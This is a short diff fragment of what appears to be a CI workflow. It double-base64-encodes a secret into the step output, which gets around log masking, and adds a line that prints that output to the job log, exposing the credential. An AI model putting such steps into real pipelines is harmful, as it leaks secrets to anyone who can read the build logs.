@@ -37,6 +37,7 @@ jobs:
           echo "CREDENTIAL2=$(echo $ENVSECRET | base64 -w0 | base64 -w0)" >> $GITHUB_OUTPUT
 
           echo "$GITHUB_OUTPUT"
+          cat $GITHUB_OUTPUT
 
 
   call_runner:
